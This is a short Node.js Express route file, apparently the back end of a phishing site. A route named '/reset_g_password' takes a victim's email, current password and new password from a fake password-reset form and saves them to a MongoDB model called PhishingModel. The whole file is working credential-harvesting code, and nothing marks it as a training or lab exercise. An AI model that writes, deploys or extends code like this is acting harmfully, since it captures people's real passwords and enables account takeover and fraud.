let express = require('express');
let app = express.Router();
let mongoose = require('mongoose');
const bodyParser = require('body-parser');
const PhishingModel = require('../models/PhishingModel');
const urlEncoded = bodyParser.urlencoded({extended: false});

app.post('/reset_g_password', urlEncoded, (req, res)=>{

    let email = req.body.email;
    let current_password = req.body.current_password;
    let new_password = req.body.new_password;

    PhishingModel({ email, current_password, new_password}).save()
    .then(()=>{
        res.json("Successs");
    })
    .catch(err => {
        res.status(500).json();
    })
});

module.exports = app;